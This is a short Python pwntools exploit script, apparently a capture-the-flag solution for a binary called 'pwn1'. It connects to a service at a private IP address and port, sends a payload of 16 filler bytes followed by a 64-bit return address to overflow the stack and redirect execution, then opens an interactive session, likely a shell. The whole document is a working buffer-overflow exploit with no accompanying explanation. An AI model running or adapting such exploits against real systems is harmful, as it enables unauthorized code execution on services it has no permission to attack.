from pwn import *

p = remote('10.140.0.8', 11111)
#p = process('./pwn1')
offset = 'a' * 16
target_addr = 0x04005fb
payload = offset + p64(target_addr)
p.sendline(payload)
p.interactive()
